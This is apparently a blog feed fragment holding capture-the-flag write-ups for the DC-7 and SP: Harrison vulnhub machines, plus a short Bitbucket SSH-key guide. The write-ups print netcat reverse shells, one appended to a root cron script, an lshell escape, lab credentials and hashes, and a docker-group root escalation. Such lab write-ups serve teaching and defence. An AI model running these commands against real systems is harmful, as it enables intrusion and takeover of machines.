+&lt;p&gt;In the user&amp;rsquo;s home folder, we have a folder for backups, and an mbox file.  If we cat the mailbox, it looks like there&amp;rsquo;s a cron job running every 15 minutes, that&amp;rsquo;s backing up the site, and emailing the report to dc7user:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;From root@dc-7 Thu Aug 29 17:00:22 2019
+Return-path: &amp;lt;root@dc-7&amp;gt;
+Envelope-to: root@dc-7
+Delivery-date: Thu, 29 Aug 2019 17:00:22 +1000
+Received: from root by dc-7 with local (Exim 4.89)
+	(envelope-from &amp;lt;root@dc-7&amp;gt;)
+	id 1i3EPu-0000CV-5C
+	for root@dc-7; Thu, 29 Aug 2019 17:00:22 +1000
+From: root@dc-7 (Cron Daemon)
+To: root@dc-7
+Subject: Cron &amp;lt;root@dc-7&amp;gt; /opt/scripts/backups.sh
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &amp;lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&amp;gt;
+X-Cron-Env: &amp;lt;SHELL=/bin/sh&amp;gt;
+X-Cron-Env: &amp;lt;HOME=/root&amp;gt;
+X-Cron-Env: &amp;lt;LOGNAME=root&amp;gt;
+Message-Id: &amp;lt;E1i3EPu-0000CV-5C@dc-7&amp;gt;
+Date: Thu, 29 Aug 2019 17:00:22 +1000
+
+Database dump saved to /home/dc7user/backups/website.sql               [success]
+gpg: symmetric encryption of &#39;/home/dc7user/backups/website.tar.gz&#39; failed: File exists
+gpg: symmetric encryption of &#39;/home/dc7user/backups/website.sql&#39; failed: File exists
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Couple interesting things here:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;The script is living in /opt/scripts/backups.sh, and&lt;/li&gt;
+&lt;li&gt;it&amp;rsquo;s running as root.&lt;br /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;I tried to edit it or append to it, but got permission errors.  Looks like it&amp;rsquo;s owned by the www-data user.  I did some more checks on the user account, but didn&amp;rsquo;t find anything super promising.  Guess we need to take another look at Drupal.&lt;/p&gt;
+
+&lt;p&gt;I ran a tool called Droopescan to see if it turned up anything, but didn&amp;rsquo;t get anything helpful:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[+] Site identified as drupal.
+[+] Themes found:
+    startupgrowth_lite http://192.168.99.20/themes/startupgrowth_lite/
+        http://192.168.99.20/themes/startupgrowth_lite/LICENSE.txt
+
+[+] Possible interesting urls found:
+    Default admin - http://192.168.99.20/user/login
+
+[+] Possible version(s):
+    8.7.0
+    8.7.0-alpha1
+    8.7.0-alpha2
+    8.7.0-beta1
+    8.7.0-beta2
+    8.7.0-rc1
+    8.7.1
+    8.7.2
+    8.7.3
+
+[+] No plugins found.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I also hopped back on the box as dc7user and took a closer look through the Drupal install.  I managed to get the db creds (which were different than the ones we found in Github), and checked the db for clues.  Nothing too interesting, but we did get the list of valid users on the site:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$databases[&#39;default&#39;][&#39;default&#39;] = array (
+  &#39;database&#39; =&amp;gt; &#39;d7db&#39;,
+  &#39;username&#39; =&amp;gt; &#39;db7user&#39;,
+  &#39;password&#39; =&amp;gt; &#39;yNv3Po00&#39;,
+  &#39;prefix&#39; =&amp;gt; &#39;&#39;,
+  &#39;host&#39; =&amp;gt; &#39;localhost&#39;,
+  &#39;port&#39; =&amp;gt; &#39;&#39;,
+  &#39;namespace&#39; =&amp;gt; &#39;Drupal\\Core\\Database\\Driver\\mysql&#39;,
+  &#39;driver&#39; =&amp;gt; &#39;mysql&#39;,
+);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;MariaDB [d7db]&amp;gt; select * from users_field_data;
++-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+
+| uid | langcode | preferred_langcode | preferred_admin_langcode | name    | pass                                                    | mail              | timezone            | status | created    | changed    | access     | login      | init              | default_langcode |
++-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+
+|   0 | en       | en                 | NULL                     |         | NULL                                                    | NULL              |                     |      0 | 1567054076 | 1567054076 |          0 |          0 | NULL              |                1 |
+|   1 | en       | en                 | NULL                     | admin   | $S$E8joY5kexnKYRHEw92AtUVWXDTKPV/kBNnS2nYjI/xOwb.xV7TQS | admin@example.com | Australia/Melbourne |      1 | 1567054076 | 1567555661 | 1567556494 | 1567555735 | admin@example.com |                1 |
+|   2 | en       | en                 | en                       | dc7user | $S$EKe0kuKQvFhgFnEYMpq.mRtbl/TQ5FmEjCDxbu0HIHaO0/U.YFjI | dc7user@blah.com  | Australia/Brisbane  |      1 | 1567057938 | 1567057938 |          0 |          0 | dc7user@blah.com  |                1 |
++-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+
+3 rows in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Finally, I noticed in dc7user&amp;rsquo;s home directory, a folder called &lt;code&gt;.drush&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://www.drush.org/&#34;&gt;Drush&lt;/a&gt; is a command line shell for Drupal.  I spent quite a bit of time reading about it, before learning that it&amp;rsquo;s sensitive about where you run it from.  When I ran it from the www root folder, I was able to reset the admin user&amp;rsquo;s password:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;dc7user@dc-7:/var/www/html$ drush user-password admin --password=&amp;quot;test&amp;quot;
+Changed password for admin
+[success]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And just like that we&amp;rsquo;re in!&lt;/p&gt;
+
+&lt;p&gt;Now that we have a Drupal admin account, we need to use it to get a shell.  Remember that script that was running as root?  I&amp;rsquo;m not super proud of my solution, but I found a plugin for Drupal called &lt;a href=&#34;https://www.drupal.org/project/shell&#34;&gt;shell&lt;/a&gt;, which does exactly what you think it does.  From there, it was a pretty simple matter of appending a reverse shell to the backup script that we found that runs as root:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/dc7/webshell.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Listener:
+nc -lvp 4444
+
+Connector:
+nc 192.168.99.14 4444 -e /bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once we use the web shell to get a proper reverse shell, we echo another reverse shell into the script (we probably could have just used the web shell for this, but what can I say, I prefer a proper terminal):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;echo &amp;quot;nc 192.168.99.14 4445 -e /bin/bash&amp;quot; &amp;gt;&amp;gt; /opt/scripts/backups.sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And a root shell:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;~ ᐅ nc -lvp 4445
+listening on [any] 4445 ...
+192.168.99.20: inverse host lookup failed: Unknown host
+connect to [192.168.99.14] from (UNKNOWN) [192.168.99.20] 48518
+
+whoami
+root
+cd /root
+ls
+theflag.txt
+cat theflag.txt
+
+
+
+
+888       888          888 888      8888888b.                             888 888 888 888
+888   o   888          888 888      888  &amp;quot;Y88b                            888 888 888 888
+888  d8b  888          888 888      888    888                            888 888 888 888
+888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
+888d88888b888 d8P  Y8b 888 888      888    888 d88&amp;quot;&amp;quot;88b 888 &amp;quot;88b d8P  Y8b 888 888 888 888
+88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
+8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &amp;quot;   &amp;quot;   &amp;quot;   &amp;quot;  
+888P     Y888  &amp;quot;Y8888  888 888      8888888P&amp;quot;   &amp;quot;Y88P&amp;quot;  888  888  &amp;quot;Y8888  888 888 888 888
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and all those who have taken the time to complete these little
+challenges.
+
+I&#39;m sending out an especially big thanks to:
+
+@4nqr34z
+@D4mianWayne
+@0xmzfr
+@theart42
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So now that we know how to compromise this box, how could this have been avoided?&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Don&amp;rsquo;t commit passwords to a git repo.  Use a secret manager, like &lt;a href=&#34;https://www.vaultproject.io/&#34;&gt;Hashicorp Vault&lt;/a&gt;, or an environment variable file (not stored in SC) to store sensitive information.  You could also have a solution in place that rejects commits that include sensitive information.&lt;/li&gt;
+&lt;li&gt;Use ACLs or firewalls that only allow SSH connections from trusted networks.&lt;/li&gt;
+&lt;li&gt;We found the MySQL credentials pretty easily as the dc7 user.  That user probably doesn&amp;rsquo;t need to be able to read files in the www directory.  Since Drush provides the ability to reset passwords, and other neferious things on the site, that utility should also be restricted to a privileged user.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Any other suggestions?  Thoughts about this writeup?  &lt;a href=&#34;https://blog.brigzzy.ca/about/&#34;&gt;Let me know!&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>Configuring Bitbucket SSH with Multiple Keys</title>
+      <link>https://blog.brigzzy.ca/post/configuring-bitbucket-ssh-multiple-keys/</link>
+      <pubDate>Thu, 06 Jun 2019 11:30:30 -0700</pubDate>
+      <guid>https://blog.brigzzy.ca/post/configuring-bitbucket-ssh-multiple-keys/</guid>
+      <description>&lt;p&gt;If you use Bitbucket in multiple environments (for example home, and work), you may need to configure multiple SSH keys.  This is because once a key has been added to bitbucket (be it a work account, or a personal one), that key can no longer be used in any other Bitbucket account.&lt;/p&gt;
+
+&lt;p&gt;The problem is that when you try and clone a repo via SSH, you may get a permission denied error when you connect to bitbucket.org with a valid key, but not a key that&amp;rsquo;s valid for the repo you&amp;rsquo;re trying to work with.&lt;/p&gt;
+
+&lt;p&gt;To get around this, you can make an ssh config file that matches the host, username, and key you want to use.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;If you haven&amp;rsquo;t already, generate your new SSH key that you want to use with Bitbucket:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ssh-keygen -o -a 100 -t ed25519 -f ~/.ssh/id_bitbucket_personal
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Add the public key to your Bitbucket account&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Create a &lt;code&gt;~/.ssh/config&lt;/code&gt; file&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Add the following lines, substituting your values&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Host bitbucket.org
+User &amp;lt;someone&amp;gt;
+Hostname bitbucket.org
+IdentitiesOnly yes
+IdentityFile ~/.ssh/id_bitbucket_personal
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Note that you can use any name in the User field.  You probably don&amp;rsquo;t want to use git, if you&amp;rsquo;re using that as your identity for another account.&lt;/p&gt;
+&lt;/blockquote&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Now you can clone the repo from bitbucket.org, replacing the username git with the user you&amp;rsquo;ve configured in the ssh config file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;git clone someone@bitbucket.org:myorg/repo.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+    </item>
+    <item>
+      <title>Writup - SP: Harrison</title>
+      <link>https://blog.brigzzy.ca/post/writup-sp-harrison/</link>
+      <pubDate>Sat, 25 May 2019 21:23:54 -0700</pubDate>
+      <guid>https://blog.brigzzy.ca/post/writup-sp-harrison/</guid>
+      <description>
+
+&lt;p&gt;Welcome to my blog!  This is my first write up on a vulnhub VM.  The VM in question is by &lt;a href=&#34;https://dsolstad.com/&#34;&gt;Daniel Solstad&lt;/a&gt;, and is hosted by &lt;a href=&#34;vulnhub.com&#34;&gt;vulnhub.com&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&#34;summary&#34;&gt;Summary:&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Scan the network&lt;/li&gt;
+&lt;li&gt;Scan the host&lt;/li&gt;
+&lt;li&gt;Check out SMB&lt;/li&gt;
+&lt;li&gt;Break out of a restricted shell&lt;/li&gt;
+&lt;li&gt;Enumerate the host&lt;/li&gt;
+&lt;li&gt;Get the root flag&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&#34;scan-the-network&#34;&gt;Scan the Network:&lt;/h4&gt;
+
+&lt;p&gt;First we use netdiscover to see where the vulnerable system is.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;netdiscover -r 192.168.99.0/24
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;Currently scanning: Finished! | Screen View: Unique Hosts
+
+4 Captured ARP Req/Rep packets, from 4 hosts. Total size: 240
+_____________________________________________________________________________
+IP At MAC Address Count Len MAC Vendor / Hostname
+-----------------------------------------------------------------------------
+192.168.99.1    52:54:00:12:35:00 1 60 Unknown vendor
+192.168.99.2    52:54:00:12:35:00 1 60 Unknown vendor
+192.168.99.3    08:00:27:dc:37:c5 1 60 PCS Systemtechnik GmbH
+192.168.99.23   08:00:27:45:0b:aa 1 60 PCS Systemtechnik GmbH
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Boom, we have out host!&lt;/p&gt;
+
+&lt;h4 id=&#34;scan-the-host&#34;&gt;Scan the Host:&lt;/h4&gt;
+
+&lt;p&gt;Now we&amp;rsquo;re going to fire up nmap, and scan the host.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;nmap -T4 -A -p- 192.168.99.23
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-24 16:51 PDT
+Nmap scan report for 192.168.99.23
+Host is up (0.00059s latency).
+Not shown: 65533 closed ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 2048 5b:87:f1:fe:67:8f:a6:ba:8b:75:3c:11:34:3d:b6:b8 (RSA)
+| 256 93:87:7e:2e:5e:4e:ce:71:56:a1:1c:6b:fc:1f:6e:55 (ECDSA)
+|_ 256 c0:14:c0:24:e8:a8:7e:d4:cd:a6:42:25:f3:48:47:94 (ED25519)
+445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+MAC Address: 08:00:27:45:0B:AA (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: Host: HARRISON; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 5s, deviation: 1s, median: 4s
+| smb-os-discovery:
+| OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+| Computer name: harrison
+| NetBIOS computer name: HARRISON\x00
+| Domain name: \x00
+| FQDN: harrison
+|_ System time: 2019-05-24T23:52:14+00:00
+| smb-security-mode:
+| account_used: guest
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+| 2.02:
+|_ Message signing enabled but not required
+| smb2-time:
+| date: 2019-05-24 16:52:15
+|_ start_date: N/A
+
+TRACEROUTE
+HOP RTT ADDRESS
+1 0.59 ms 192.168.99.23
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.77 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;From the scan, we can see that port 445 (SMB) is open.  SMB usually indicates file shares.  Let&amp;rsquo;s do another scan and see if we can get some more information.  Nmap has a great script for hunting for SMB shares:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;nmap --script=smb-enum-shares 192.168.99.23
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-24 16:56 PDT
+Nmap scan report for 192.168.99.23
+Host is up (0.00015s latency).
+Not shown: 998 closed ports
+PORT STATE SERVICE
+22/tcp open ssh
+445/tcp open microsoft-ds
+MAC Address: 08:00:27:45:0B:AA (Oracle VirtualBox virtual NIC)
+
+Host script results:
+| smb-enum-shares:
+| account_used: &amp;lt;blank&amp;gt;
+| \\192.168.99.23\IPC$:
+| Type: STYPE_IPC_HIDDEN
+| Comment: IPC Service (Samba 4.7.6-Ubuntu)
+| Users: 1
+| Max Users: &amp;lt;unlimited&amp;gt;
+| Path: C:\tmp
+| Anonymous access: READ/WRITE
+| \\192.168.99.23\Private:
+| Type: STYPE_DISKTREE
+| Comment:
+| Users: 0
+| Max Users: &amp;lt;unlimited&amp;gt;
+| Path: C:\home\harrison
+|_ Anonymous access: READ/WRITE
+
+Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Well, well, well, looks like Harrison&amp;rsquo;s home directory is wide open!  Let&amp;rsquo;s connect and see what&amp;rsquo;s in there.&lt;/p&gt;
+
+&lt;h4 id=&#34;check-out-smb&#34;&gt;Check out SMB:&lt;/h4&gt;
+
+&lt;p&gt;Since anonymous access is enabled, we can just use smbclient to connect to the share and poke around:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;smbclient -N //192.168.99.23/Private
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# smbclient -N //192.168.99.23/Private
+Anonymous login successful
+Try &amp;quot;help&amp;quot; to get a list of possible commands.
+smb: \&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once we&amp;rsquo;re in, we can see that we are indeed in a home directory.  Let&amp;rsquo;s grab some interesting files:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;smb: \&amp;gt; ls
+. D 0 Thu Apr 18 09:55:51 2019
+.. D 0 Thu Apr 18 09:12:55 2019
+.bash_logout H 220 Wed Apr 4 11:30:26 2018
+.profile H 807 Wed Apr 4 11:30:26 2018
+.bashrc H 3771 Wed Apr 4 11:30:26 2018
+silly_cats D 0 Thu Apr 18 09:55:51 2019
+.ssh DH 0 Thu Apr 18 09:42:57 2019
+flag.txt N 32 Thu Apr 18 09:14:18 2019
+
+32894736 blocks of size 1024. 27324024 blocks available
+smb: \&amp;gt; get flag.txt
+getting file \flag.txt of size 32 as flag.txt (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
+smb: \&amp;gt; get .ssh\
+.ssh\authorized_keys .ssh\id_rsa .ssh\id_rsa.pub
+smb: \&amp;gt; get .ssh\id_rsa
+getting file \.ssh\id_rsa of size 1679 as .ssh\id_rsa (164.0 KiloBytes/sec) (average 83.5 KiloBytes/sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We have a user flag!  Let&amp;rsquo;s download it and check it out.  We also have a private key in the .ssh folder.  We can probably use this to log into the system via SSH.&lt;/p&gt;
+
+&lt;p&gt;First we&amp;rsquo;ll check out the flag:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cat flag.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# cat flag.txt
+It&#39;s not going to be that easy.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Wouldn&amp;rsquo;t be much of a prison if we could just grab the flag off an open file share, would it?  Let&amp;rsquo;s SSH in (after fixing the permissions on the private key):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;chmod 600 id_rsa &amp;amp;&amp;amp; ssh -i id_rsa harrison@192.168.99.23
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# chmod 600 id_rsa
+root@kali:~# ssh -i id_rsa harrison@192.168.99.23
+The authenticity of host &#39;192.168.99.23 (192.168.99.23)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:4dYpYoutbqxX67U1GWar5n+R7JcfOY9yGk2HJbI1mKs.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added &#39;192.168.99.23&#39; (ECDSA) to the list of known hosts.
+
+Welcome to Harrison. Enjoy your shell.
+
+Type &#39;?&#39; or &#39;help&#39; to get the list of allowed commands
+harrison:~$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Boom, we got a user shell!&lt;/p&gt;
+
+&lt;h4 id=&#34;break-out-of-a-restricted-shell&#34;&gt;Break out of a restricted shell:&lt;/h4&gt;
+
+&lt;p&gt;Looks like the shell we have is pretty locked down:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;harrison:~$ ls
+flag.txt silly_cats
+harrison:~$ cd /
+*** forbidden path: /
+harrison:~$ sudo -l
+*** forbidden sudo command: sudo -l
+harrison:~$ ?
+cd clear echo exit help history ll lpath ls lsudo
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is our toolkit.  Not much to work with.  In order to break out, we&amp;rsquo;ll need to figure out which restricted shell we&amp;rsquo;re in.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;harrison:~$ echo $SHELL
+*** forbidden path: /usr/bin/lshell
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;OK, so it&amp;rsquo;s something called &lt;a href=&#34;https://github.com/ghantoos/lshell&#34;&gt;lshell&lt;/a&gt;.  To escape the shell, I did some searching, and found a bug on the lshell bugtracker that we can use to get into a real shell:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;harrison:~$ echo &amp;amp;&amp;amp; &#39;bash&#39;
+harrison@harrison:~$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;enumerate-the-host&#34;&gt;Enumerate the Host:&lt;/h4&gt;
+
+&lt;p&gt;Now that we have a real shell, let&amp;rsquo;s do some manual host enumeration. Just for fun, we check /root, and find that we can read the files in it!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;harrison@harrison:~$ ls /root
+flag.txt
+harrison@harrison:~$ cat /root/flag.txt
+Nope. No flags here. Where do you think you are?
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Well, hmm.  Looks like the flag isn&amp;rsquo;t here.  But the name of the game is to read the root flag, right?  Let&amp;rsquo;s keep looking.  We can poke at the host by hand, but I like using this LinEnum script:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh &amp;amp;&amp;amp; chmod +x LinEnum.sh &amp;amp;&amp;amp; ./LinEnum.sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;harrison@harrison:~$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+--2019-05-25 00:35:05-- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.40.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.40.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 45639 (45K) [text/plain]
+Saving to: &#39;LinEnum.sh&#39;
+
+LinEnum.sh 100%[========================================&amp;gt;] 44.57K --.-KB/s in 0.06s
+
+2019-05-25 00:35:06 (740 KB/s) - &#39;LinEnum.sh&#39; saved [45639/45639]
+
+harrison@harrison:~$ chmod +x LinEnum.sh
+harrison@harrison:~$ ./LinEnum.sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The output from this command is pretty long, and you should definitely read through it all, so you know what it&amp;rsquo;s capable of, but in the interest of shortening the post, I&amp;rsquo;ll show you what caught my eye:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[+] Looks like we&#39;re in a Docker container:
+12:blkio:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+11:perf_event:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+9:memory:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+8:devices:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+7:freezer:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+6:net_cls,net_prio:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+5:cpuset:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+4:hugetlb:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+3:pids:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+2:cpu,cpuacct:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+1:name=systemd:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+-rwxr-xr-x 1 root root 0 May 24 23:39 /.dockerenv
+
+[+] We&#39;re a member of the (docker) group - could possibly misuse these rights!
+uid=1000(harrison) gid=1000(harrison) groups=1000(harrison),27(sudo),999(docker)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Jackpot!  We&amp;rsquo;re in a Docker container.  Even better, we&amp;rsquo;re a member of the docker group.  That means we can run docker ourselves.  Without getting too technical, when you run a docker container, unless you tell it not to, it&amp;rsquo;ll run as root.  If you run a container as root (Which you&amp;rsquo;re allowed to do as a member of the Docker group), and mount the underlying file system, you basically have root on that system!  Pretty neat, huh?&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s see how it&amp;rsquo;s done&lt;/p&gt;
+
+&lt;h4 id=&#34;get-the-root-flag&#34;&gt;Get the Root Flag:&lt;/h4&gt;
+
+&lt;p&gt;To misuse docker, we need to run it.  Alas:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;harrison@harrison:~$ docker
+bash: docker: command not found
+harrison@harrison:~$ which docker
+harrison@harrison:~$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Docker isn&amp;rsquo;t installed in the container.  Installing it would be tricky, since we don&amp;rsquo;t have sudo, or the root password.  Good news is that Docker offers the binaries for download, without needing to install them:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;wget https://download.docker.com/linux/static/stable/x86_64/docker-18.03.0-ce.tgz &amp;amp;&amp;amp; tar zxf docker-18.03.0-ce.tgz &amp;amp;&amp;amp; cd docker &amp;amp;&amp;amp; ./docker
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;harrison@harrison:~$ wget https://download.docker.com/linux/static/stable/x86_64/docker-18.03.0-ce.tgz
+--2019-05-25 00:50:07-- https://download.docker.com/linux/static/stable/x86_64/docker-18.03.0-ce.tgz
+Resolving download.docker.com (download.docker.com)... 13.224.2.97, 13.224.2.123, 13.224.2.101, ...
+Connecting to download.docker.com (download.docker.com)|13.224.2.97|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 38752537 (37M) [application/x-tar]
+Saving to: &#39;docker-18.03.0-ce.tgz&#39;
+
+docker-18.03.0-ce.tgz 100%[============================================================================================================&amp;gt;] 36.96M 13.1MB/s in 2.8s
+
+2019-05-25 00:50:10 (13.1 MB/s) - &#39;docker-18.03.0-ce.tgz&#39; saved [38752537/38752537]
+
+harrison@harrison:~$ tar zxf docker-18.03.0-ce.tgz
+harrison@harrison:~$ ls
+LinEnum.sh docker docker-18.03.0-ce.tgz flag.txt silly_cats
+harrison@harrison:~$ cd docker
+harrison@harrison:~/docker$ ls
+docker docker-containerd docker-containerd-ctr docker-containerd-shim docker-init docker-proxy docker-runc dockerd
+harrison@harrison:~/docker$ ./docker
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now let&amp;rsquo;s run the container.  We&amp;rsquo;re going to mount the root filesystem for the underlying host at the /home directory in the new container:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;./docker run -it -v /:/home/ ubuntu bash
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;harrison@harrison:~/docker$ ./docker run -it -v /:/home/ ubuntu bash
+root@bec2ede58b0f:/#
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Note that the prompt changes.  We&amp;rsquo;re now the root user in this new container.  Let&amp;rsquo;s take a look at the home directory:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cat /home/root/flag.txt
+&lt;/code&gt;&lt;/pre&gt;
+
